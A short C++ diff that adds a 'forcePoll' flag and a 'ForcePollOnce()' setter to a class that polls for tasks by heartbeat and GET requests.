@@ -82,4 +82,8 @@ public:
     
 private:
     BOOL  hasPendingTasks = FALSE; // Set when heartbeat says "has tasks" but GET hasn't completed yet
+	BOOL  forcePoll = FALSE;       // Force a GET poll (ignore heartbeat hasTasks signal)
+
+public:
+	void  ForcePollOnce() { this->forcePoll = TRUE; }
 };
